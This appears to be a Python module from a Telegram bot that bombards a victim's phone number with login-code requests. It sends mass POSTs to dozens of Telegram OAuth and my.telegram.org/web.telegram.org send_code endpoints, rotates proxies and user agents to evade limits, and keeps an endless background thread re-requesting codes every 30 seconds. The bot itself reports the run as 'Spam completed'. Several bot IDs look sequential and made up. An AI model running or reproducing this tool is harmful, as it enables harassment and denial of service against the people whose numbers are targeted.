import requests
import random
import time
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
import logging
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from bot.text import user_agents, template_file_path
from proxy.helper import load_proxies
import os

# Список URL-адресов сервисов
urls = [
    'https://oauth.telegram.org/auth/request?bot_id=1526586192&origin=https%3A%2F%2Ftgstat.com&embed=1&return_to=https%3A%2F%2Ftgstat.com%2Flogin',
    'https://oauth.telegram.org/auth/request?bot_id=1309901071&origin=https%3A%2F%2Ftelegraph.ru&embed=1&return_to=https%3A%2F%2Ftelegraph.ru%2Fauth',
    'https://oauth.telegram.org/auth/request?bot_id=1651457771&origin=https%3A%2F%2Fmarketbot.io&embed=1&return_to=https%3A%2F%2Fmarketbot.io%2Flogin',
    'https://oauth.telegram.org/auth/request?bot_id=1502654563&origin=https%3A%2F%2Ftgclick.ru&embed=1&return_to=https%3A%2F%2Ftgclick.ru%2Fauth',
    'https://oauth.telegram.org/auth/request?bot_id=1293845290&origin=https%3A%2F%2Ftgtraf.ru&embed=1&return_to=https%3A%2F%2Ftgtraf.ru%2Flogin',
    'https://oauth.telegram.org/auth/request?bot_id=1146281232&origin=https%3A%2F%2Ftelegraf.money&embed=1&return_to=https%3A%2F%2Ftelegraf.money%2Flogin',
    'https://oauth.telegram.org/auth/request?bot_id=1911123892&origin=https%3A%2F%2Fpostopek.com&embed=1&return_to=https%3A%2F%2Fpostopek.com%2Fauth',
    'https://oauth.telegram.org/auth/request?bot_id=1369915342&origin=https%3A%2F%2Ftgrm.su&embed=1&return_to=https%3A%2F%2Ftgrm.su%2Flogin',
    'https://oauth.telegram.org/auth/request?bot_id=1893345121&origin=https%3A%2F%2Ftoptelegram.io&embed=1&return_to=https%3A%2F%2Ftoptelegram.io%2Fauth',
    'https://oauth.telegram.org/auth/request?bot_id=1378223931&origin=https%3A%2F%2Ftelegram-target.ru&embed=1&return_to=https%3A%2F%2Ftelegram-target.ru%2Flogin',
    'https://oauth.telegram.org/auth/request?bot_id=1889222382&origin=https%3A%2F%2Fmytgmanager.ru&embed=1&return_to=https%3A%2F%2Fmytgmanager.ru%2Fauth',
    'https://oauth.telegram.org/auth/request?bot_id=1987712837&origin=https%3A%2F%2Ftelegram-ads.ru&embed=1&return_to=https%3A%2F%2Ftelegram-ads.ru%2Flogin',
    'https://oauth.telegram.org/auth/request?bot_id=1990024451&origin=https%3A%2F%2Ftgadmin.pro&embed=1&return_to=https%3A%2F%2Ftgadmin.pro%2Fauth',
    'https://oauth.telegram.org/auth/request?bot_id=1921331447&origin=https%3A%2F%2Ftgaudit.ru&embed=1&return_to=https%3A%2F%2Ftgaudit.ru%2Flogin',
    'https://oauth.telegram.org/auth/request?bot_id=1111111221&origin=https%3A%2F%2Ftelegreat.ru&embed=1&return_to=https%3A%2F%2Ftelegreat.ru%2Fauth',
    'https://oauth.telegram.org/auth/request?bot_id=1637745372&origin=https%3A%2F%2Ftgpay.ru&embed=1&return_to=https%3A%2F%2Ftgpay.ru%2Flogin',
    'https://oauth.telegram.org/auth/request?bot_id=1733143901&origin=https%3A%2F%2Ftgbroker.ru&embed=1&return_to=https%3A%2F%2Ftgbroker.ru%2Fauth',
    'https://oauth.telegram.org/auth/request?bot_id=1478264232&origin=https%3A%2F%2Fbotstart.ru&embed=1&return_to=https%3A%2F%2Fbotstart.ru%2Fauth',
    'https://oauth.telegram.org/auth/request?bot_id=1811135531&origin=https%3A%2F%2Fads-telegram.ru&embed=1&return_to=https%3A%2F%2Fads-telegram.ru%2Flogin',
    'https://oauth.telegram.org/auth/request?bot_id=1497286729&origin=https%3A%2F%2Ftgbot.market&embed=1&return_to=https%3A%2F%2Ftgbot.market%2Fauth',
    'https://oauth.telegram.org/auth/request?bot_id=1324571891&origin=https%3A%2F%2Ftelegabot.ru&embed=1&return_to=https%3A%2F%2Ftelegabot.ru%2Flogin',
    'https://oauth.telegram.org/auth/request?bot_id=1548212291&origin=https%3A%2F%2Fweb-telegram.ru&embed=1&return_to=https%3A%2F%2Fweb-telegram.ru%2Fauth',
    'https://oauth.telegram.org/auth/request?bot_id=1701991182&origin=https%3A%2F%2Ftgpanel.ru&embed=1&return_to=https%3A%2F%2Ftgpanel.ru%2Flogin',
    'https://oauth.telegram.org/auth/request?bot_id=1941112452&origin=https%3A%2F%2Ftelegramstore.ru&embed=1&return_to=https%3A%2F%2Ftelegramstore.ru%2Fauth',
    'https://oauth.telegram.org/auth/request?bot_id=1798421143&origin=https%3A%2F%2Fbotleader.ru&embed=1&return_to=https%3A%2F%2Fbotleader.ru%2Fauth',
    'https://oauth.telegram.org/auth/request?bot_id=1438721423&origin=https%3A%2F%2Ftgincome.ru&embed=1&return_to=https%3A%2F%2Ftgincome.ru%2Flogin',
    'https://oauth.telegram.org/auth/request?bot_id=1866421172&origin=https%3A%2F%2Fadsbot.io&embed=1&return_to=https%3A%2F%2Fadsbot.io%2Fauth',
    'https://oauth.telegram.org/auth/request?bot_id=1553912492&origin=https%3A%2F%2Ftgchecker.ru&embed=1&return_to=https%3A%2F%2Ftgchecker.ru%2Flogin',
    'https://oauth.telegram.org/auth/request?bot_id=1939221364&origin=https%3A%2F%2Ftgpromo.ru&embed=1&return_to=https%3A%2F%2Ftgpromo.ru%2Fauth',
    'https://oauth.telegram.org/auth/request?bot_id=1459171874&origin=https%3A%2F%2Fstatbot.ru&embed=1&return_to=https%3A%2F%2Fstatbot.ru%2Flogin',
    'https://oauth.telegram.org/auth/request?bot_id=1762341934&origin=https%3A%2F%2Fbotlike.ru&embed=1&return_to=https%3A%2F%2Fbotlike.ru%2Fauth',
    'https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin',
    'https://translations.telegram.org/auth/request',
    'https://translations.telegram.org/auth/request',
    'https://oauth.telegram.org/auth?bot_id=5444323279&origin=https%3A%2F%2Ffragment.com&request_access=write&return_to=https%3A%2F%2Ffragment.com%2F',
    'https://oauth.telegram.org/auth?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1&request_access=write&return_to=https%3A%2F%2Fbot-t.com%2Flogin',
    'https://oauth.telegram.org/auth/request?bot_id=1093384146&origin=https%3A%2F%2Foff-bot.ru&embed=1&request_access=write&return_to=https%3A%2F%2Foff-bot.ru%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
    'https://oauth.telegram.org/auth/request?bot_id=466141824&origin=https%3A%2F%2Fmipped.com&embed=1&request_access=write&return_to=https%3A%2F%2Fmipped.com%2Ff%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
    'https://oauth.telegram.org/auth/request?bot_id=5463728243&origin=https%3A%2F%2Fwww.spot.uz&return_to=https%3A%2F%2Fwww.spot.uz%2Fru%2F2022%2F04%2F29%2Fyoto%2F%23',
    'https://oauth.telegram.org/auth/request?bot_id=1733143901&origin=https%3A%2F%2Ftbiz.pro&embed=1&request_access=write&return_to=https%3A%2F%2Ftbiz.pro%2Flogin',
    'https://oauth.telegram.org/auth/request?bot_id=319709511&origin=https%3A%2F%2Ftelegrambot.biz&embed=1&return_to=https%3A%2F%2Ftelegrambot.biz%2F',
    'https://oauth.telegram.org/auth/request?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1&return_to=https%3A%2F%2Fbot-t.com%2Flogin',
    'https://oauth.telegram.org/auth/request?bot_id=1803424014&origin=https%3A%2F%2Fru.telegram-store.com&embed=1&request_access=write&return_to=https%3A%2F%2Fru.telegram-store.com%2Fcatalog%2Fsearch',
    'https://oauth.telegram.org/auth/request?bot_id=210944655&origin=https%3A%2F%2Fcombot.org&embed=1&request_access=write&return_to=https%3A%2F%2Fcombot.org%2Flogin',
    'https://my.telegram.org/auth/send_password',
    'https://oauth.telegram.org/auth/request?bot_id=2012345678&origin=https%3A%2F%2Ftgboost.ru&embed=1&return_to=https%3A%2F%2Ftgboost.ru%2Fauth',
    'https://oauth.telegram.org/auth/request?bot_id=2023456789&origin=https%3A%2F%2Fbotmaster.io&embed=1&return_to=https%3A%2F%2Fbotmaster.io%2Flogin',
    'https://oauth.telegram.org/auth/request?bot_id=2034567890&origin=https%3A%2F%2Ftganalytics.ru&embed=1&return_to=https%3A%2F%2Ftganalytics.ru%2Fauth',
    'https://oauth.telegram.org/auth/request?bot_id=2045678901&origin=https%3A%2F%2Ftgconnect.ru&embed=1&return_to=https%3A%2F%2Ftgconnect.ru%2Flogin',
    'https://oauth.telegram.org/auth/request?bot_id=2056789012&origin=https%3A%2F%2Fbotsocial.ru&embed=1&return_to=https%3A%2F%2Fbotsocial.ru%2Fauth',
    'https://oauth.telegram.org/auth/request?bot_id=2067890123&origin=https%3A%2F%2Ftgmarket.ru&embed=1&return_to=https%3A%2F%2Ftgmarket.ru%2Flogin',
    'https://oauth.telegram.org/auth/request?bot_id=2078901234&origin=https%3A%2F%2Ftgtools.io&embed=1&return_to=https%3A%2F%2Ftgtools.io%2Fauth',
    'https://oauth.telegram.org/auth/request?bot_id=2089012345&origin=https%3A%2F%2Fbotgrowth.ru&embed=1&return_to=https%3A%2F%2Fbotgrowth.ru%2Flogin',
    'https://oauth.telegram.org/auth/request?bot_id=2090123456&origin=https%3A%2F%2Ftgengage.ru&embed=1&return_to=https%3A%2F%2Ftgengage.ru%2Fauth',
    'https://oauth.telegram.org/auth/request?bot_id=2101234567&origin=https%3A%2F%2Ftgdata.ru&embed=1&return_to=https%3A%2F%2Ftgdata.ru%2Flogin',
    'https://oauth.telegram.org/auth/request?bot_id=2112345678&origin=https%3A%2F%2Fbotpro.ru&embed=1&return_to=https%3A%2F%2Fbotpro.ru%2Fauth',
    'https://oauth.telegram.org/auth/request?bot_id=2123456789&origin=https%3A%2F%2Ftgsecure.ru&embed=1&return_to=https%3A%2F%2Ftgsecure.ru%2Flogin',
    'https://oauth.telegram.org/auth/request?bot_id=2134567890&origin=https%3A%2F%2Fbotcamp.ru&embed=1&return_to=https%3A%2F%2Fbotcamp.ru%2Fauth',
    'https://oauth.telegram.org/auth/request?bot_id=2145678901&origin=https%3A%2F%2Ftgsupport.ru&embed=1&return_to=https%3A%2F%2Ftgsupport.ru%2Flogin',
    'https://oauth.telegram.org/auth/request?bot_id=2156789012&origin=https%3A%2F%2Ftgexpert.ru&embed=1&return_to=https%3A%2F%2Ftgexpert.ru%2Fauth',
    'https://oauth.telegram.org/auth/request?bot_id=2167890123&origin=https%3A%2F%2Fbotlink.ru&embed=1&return_to=https%3A%2F%2Fbotlink.ru%2Flogin',
    'https://oauth.telegram.org/auth/request?bot_id=2178901234&origin=https%3A%2F%2Ftgmonitor.ru&embed=1&return_to=https%3A%2F%2Ftgmonitor.ru%2Fauth',
    'https://oauth.telegram.org/auth/request?bot_id=2189012345&origin=https%3A%2F%2Fbotbase.ru&embed=1&return_to=https%3A%2F%2Fbotbase.ru%2Flogin',
    'https://oauth.telegram.org/auth/request?bot_id=2190123456&origin=https%3A%2F%2Ftgreach.ru&embed=1&return_to=https%3A%2F%2Ftgreach.ru%2Fauth',
    'https://oauth.telegram.org/auth/request?bot_id=2201234567&origin=https%3A%2F%2Ftgflow.ru&embed=1&return_to=https%3A%2F%2Ftgflow.ru%2Flogin',
    'https://oauth.telegram.org/auth/request?bot_id=2212345678&origin=https%3A%2F%2Fbotify.ru&embed=1&return_to=https%3A%2F%2Fbotify.ru%2Fauth',
    'https://oauth.telegram.org/auth?bot_id=7063197430&origin=https%3A%2F%2Fnedohackers.site'
]

# URLs для веб-версии Telegram
web_telegram_urls = [
    'https://web.telegram.org/k/',
    'https://web.telegram.org/a/',
    'https://web.telegram.org/k/auth/send_code',
    'https://web.telegram.org/a/auth/send_code'
]

def load_templates():
    """Загружает номера телефонов из файла шаблонов"""
    phones = []
    try:
        with open(template_file_path, 'r', encoding='utf-8') as f:
            lines = f.readlines()
            for line in lines:
                try:
                    number, _ = line.strip().split(' - ', 1)
                    phones.append(int(number.strip()))
                except ValueError:
                    logging.debug(f"Неверный формат строки в {template_file_path}: {line.strip()}")
                    from database.db import add_log  # Импорт внутри функции
                    add_log("DEBUG", f"Неверный формат строки в {template_file_path}: {line.strip()}")
                    continue
    except FileNotFoundError:
        logging.debug(f"Файл шаблонов {template_file_path} не найден")
        from database.db import add_log  # Импорт внутри функции
        add_log("DEBUG", f"Файл шаблонов {template_file_path} не найден")
    except Exception as e:
        logging.debug(f"Ошибка загрузки шаблонов: {str(e)}")
        from database.db import add_log  # Импорт внутри функции
        add_log("DEBUG", f"Ошибка загрузки шаблонов: {str(e)}")
    return phones

def get_chat_results(chat_id):
    """Получает результаты запросов для чата"""
    if not hasattr(get_chat_results, 'chat_results'):
        get_chat_results.chat_results = {}
    if chat_id not in get_chat_results.chat_results:
        get_chat_results.chat_results[chat_id] = []
    return get_chat_results.chat_results[chat_id]

def get_chat_logs(chat_id):
    """Получает логи запросов для чата"""
    if not hasattr(get_chat_logs, 'chat_logs'):
        get_chat_logs.chat_logs = {}
    if chat_id not in get_chat_logs.chat_logs:
        get_chat_logs.chat_logs[chat_id] = []
    return get_chat_logs.chat_logs[chat_id]

def send_web_telegram_request(phone_number, proxies):
    """Отправляет запрос кода для веб-версии Telegram"""
    try:
        url = 'https://web.telegram.org/k/auth/send_code'
        headers = {
            'user-agent': random.choice(user_agents),
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/json',
            'origin': 'https://web.telegram.org',
            'referer': 'https://web.telegram.org/k/',
            'x-requested-with': 'XMLHttpRequest'
        }
        data = {
            'phone_number': str(phone_number),
            'api_id': 2040,
            'api_hash': 'b18441a1ff607e10a989891a5462e627',
            'settings': {'_': 'device'}
        }
        proxy_dict = None
        if proxies:
            proxy = random.choice(proxies)
            proxy_dict = {
                'http': proxy['http'],
                'https': proxy['socks5']
            }
        response = requests.post(url, headers=headers, json=data, timeout=10, proxies=proxy_dict)
        proxy_info = proxy['http'] if proxies else "None"
        if response.status_code == 200:
            from database.db import add_log  # Импорт внутри функции
            add_log("INFO", f"Успешный запрос кода на {phone_number}, Proxy: {proxy_info}")
            return True, response.json()
        else:
            from database.db import add_log  # Импорт внутри функции
            add_log("ERROR", f"Неудачный запрос кода на {phone_number}, Status: {response.status_code}, Proxy: {proxy_info}")
            return False, None
    except Exception as e:
        from database.db import add_log  # Импорт внутри функции
        add_log("ERROR", f"Ошибка при запросе кода на {phone_number}: {str(e)}")
        return False, None

def start_web_telegram_background(chat_id, phone_number, proxies, bot):
    """Запускает фоновый процесс отправки запросов для веб-версии Telegram"""
    from database.db import get_user_language  # Импорт внутри функции
    def run_web_telegram():
        while True:
            try:
                success, response = send_web_telegram_request(phone_number, proxies)
                log_message = f"[{datetime.now().strftime('%d.%m.%Y %H:%M:%S')}] [WEB Telegram] {'✓' if success else '❌'} Запрос кода на {phone_number}"
                get_chat_logs(chat_id).append(log_message)
                from database.db import add_log  # Импорт внутри функции
                add_log("INFO" if success else "ERROR", log_message)
                time.sleep(30)
            except Exception as e:
                log_message = f"[{datetime.now().strftime('%d.%m.%Y %H:%M:%S')}] [WEB Telegram] ❌ Ошибка: {str(e)}"
                get_chat_logs(chat_id).append(log_message)
                from database.db import add_log  # Импорт внутри функции
                add_log("ERROR", log_message)
                time.sleep(10)
    web_thread = threading.Thread(target=run_web_telegram, daemon=True)
    web_thread.start()
    log_message = f"[{datetime.now().strftime('%d.%m.%Y %H:%M:%S')}] [WEB Telegram] 🚀 Фоновый поток запущен"
    get_chat_logs(chat_id).append(log_message)
    from database.db import add_log  # Импорт внутри функции
    add_log("INFO", log_message)
    bot.send_message(chat_id, "[WEB Telegram] 🚀 Background thread started" if get_user_language(chat_id) == 'en' else "[WEB Telegram] 🚀 Фоновый поток запущен")

def send_request(url, phone_number, cycle_number, proxies, chat_id):
    """Отправляет запрос к указанному URL"""
    try:
        headers = {
            'user-agent': random.choice(user_agents),
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://telegram.org',
            'referer': 'https://telegram.org/',
        }
        if 'my.telegram.org' in url:
            headers['origin'] = 'https://my.telegram.org'
            headers['referer'] = 'https://my.telegram.org/auth'
        proxy_dict = None
        if proxies:
            proxy = random.choice(proxies)
            proxy_dict = {
                'http': proxy['http'],
                'https': proxy['socks5']
            }
        response = requests.post(
            url,
            headers=headers,
            data={'phone': phone_number, 'phone_number': phone_number},
            timeout=5,
            proxies=proxy_dict
        )
        proxy_info = proxy['http'] if proxies else "None"
        log_message = f"[{datetime.now().strftime('%d.%m.%Y %H:%M:%S')}] [Cycle {cycle_number}] ✓ {url.split('?')[0]} - OK (Status: {response.status_code}, Proxy: {proxy_info})"
        get_chat_logs(chat_id).append(log_message)
        from database.db import add_log  # Импорт внутри функции
        add_log("INFO", log_message)
        return url, response.status_code, None
    except Exception as e:
        proxy_info = proxy['http'] if proxies else "None"
        log_message = f"[{datetime.now().strftime('%d.%m.%Y %H:%M:%S')}] [Cycle {cycle_number}] ✗ {url.split('?')[0]} - Error: {str(e)} (Proxy: {proxy_info})"
        get_chat_logs(chat_id).append(log_message)
        from database.db import add_log  # Импорт внутри функции
        add_log("ERROR", log_message)
        return url, None, str(e)

def run_cycle(chat_id, cycle_number, phone_number, threads_count, proxies, bot):
    """Запускает цикл отправки запросов"""
    from database.db import get_user_language  # Импорт внутри функции
    logs = get_chat_logs(chat_id)
    results = get_chat_results(chat_id)
    log_message = f"[{datetime.now().strftime('%d.%m.%Y %H:%M:%S')}] 🌀 {'Cycle' if get_user_language(chat_id) == 'en' else 'ЦИКЛ'} {cycle_number} - {'Starting' if get_user_language(chat_id) == 'en' else 'Запуск'} {len(urls)} {'requests' if get_user_language(chat_id) == 'en' else 'запросов'}..."
    logs.append(log_message)
    from database.db import add_log  # Импорт внутри функции
    add_log("INFO", log_message)
    successful = 0
    failed = 0
    start_time = time.time()
    with ThreadPoolExecutor(max_workers=threads_count) as executor:
        futures = {executor.submit(send_request, url, phone_number, cycle_number, proxies, chat_id): url for url in urls}
        for future in as_completed(futures):
            url, status_code, error = future.result()
            results.append((cycle_number, url, status_code, error))
            if status_code and status_code < 400:
                successful += 1
            else:
                failed += 1
    end_time = time.time()
    duration = end_time - start_time
    log_message = f"[{datetime.now().strftime('%d.%m.%Y %H:%M:%S')}] 📊 {'Cycle results' if get_user_language(chat_id) == 'en' else 'Результаты цикла'} {cycle_number}: ✅ {'Successful' if get_user_language(chat_id) == 'en' else 'Успешных'}: {successful}, ❌ {'Failed' if get_user_language(chat_id) == 'en' else 'Неудачных'}: {failed}, ⏱️ {'Time' if get_user_language(chat_id) == 'en' else 'Время'}: {duration:.2f} {'sec' if get_user_language(chat_id) == 'en' else 'сек'}, 🚀 {'Speed' if get_user_language(chat_id) == 'en' else 'Скорость'}: {len(urls)/duration:.2f} {'requests/sec' if get_user_language(chat_id) == 'en' else 'запросов/сек'}"
    logs.append(log_message)
    from database.db import add_log  # Импорт внутри функции
    add_log("INFO", log_message)
    return successful, failed

def run_main_process(chat_id, phone_number, proxy_file, bot, user_settings, user_id):
    """Запускает основной процесс отправки запросов"""
    from database.db import get_user_language, add_log  # Импорт внутри функции
    proxies = load_proxies(proxy_file)
    current_settings = user_settings.get(chat_id, {'cycles': 5, 'threads': 5, 'delay': 1.0})
    logs = get_chat_logs(chat_id)
    results = get_chat_results(chat_id)
    results.clear()  # Очистка предыдущих результатов
    log_message = f"[{datetime.now().strftime('%d.%m.%Y %H:%M:%S')}] 🚀 {'Starting main process for number' if get_user_language(user_id) == 'en' else 'Запуск основного процесса для номера'} {phone_number} {'with proxy' if proxy_file else 'without proxy' if get_user_language(user_id) == 'en' else 'с прокси' if proxy_file else 'без прокси'}"
    logs.append(log_message)
    add_log("INFO", log_message)
    start_web_telegram_background(chat_id, phone_number, proxies, bot)
    total_successful = 0
    total_failed = 0
    total_requests = 0
    for cycle in range(1, current_settings['cycles'] + 1):
        successful, failed = run_cycle(chat_id, cycle, phone_number, current_settings['threads'], proxies, bot)
        total_successful += successful
        total_failed += failed
        total_requests += len(urls)
        time.sleep(current_settings['delay'])
    efficiency = (total_successful / total_requests * 100) if total_requests > 0 else 0
    report_text = (
        f"📄 {'Report for' if get_user_language(user_id) == 'en' else 'Отчет о выполнении для'} {phone_number}\n\n"
        f"✅ {'Successful requests' if get_user_language(user_id) == 'en' else 'Успешных запросов'}: {total_successful}\n"
        f"❌ {'Failed requests' if get_user_language(user_id) == 'en' else 'Неудачных запросов'}: {total_failed}\n"
        f"📊 {'Total requests' if get_user_language(user_id) == 'en' else 'Всего запросов'}: {total_requests}\n"
        f"📈 {'Efficiency' if get_user_language(user_id) == 'en' else 'Эффективность'}: {efficiency:.1f}%\n\n"
        f"{'Logs' if get_user_language(user_id) == 'en' else 'Логи'}:\n{''.join(get_chat_logs(chat_id))}"
    )
    markup = InlineKeyboardMarkup()
    markup.add(
        InlineKeyboardButton('🚨 Yes, I want to' if get_user_language(user_id) == 'en' else '🚨 Да, желаю', callback_data='view_logs'),
        InlineKeyboardButton('⛔️ No, back to menu' if get_user_language(user_id) == 'en' else '⛔️ Нет, в меню', callback_data='back_to_main')
    )
    bot.send_message(chat_id, '✅ Spam completed, would you like to view logs?' if get_user_language(user_id) == 'en' else '✅ Рассылка завершена, желаете посмотреть логи?', reply_markup=markup)
    log_message = f"[{datetime.now().strftime('%d.%m.%Y %H:%M:%S')}] 🏁 {'Process completed' if get_user_language(user_id) == 'en' else 'Процесс завершен'}: {'Successful' if get_user_language(user_id) == 'en' else 'Успешных'}: {total_successful}, {'Failed' if get_user_language(user_id) == 'en' else 'Неудачных'}: {total_failed}, {'Total' if get_user_language(user_id) == 'en' else 'Всего'}: {total_requests}"
    logs.append(log_message)
    add_log("INFO", log_message)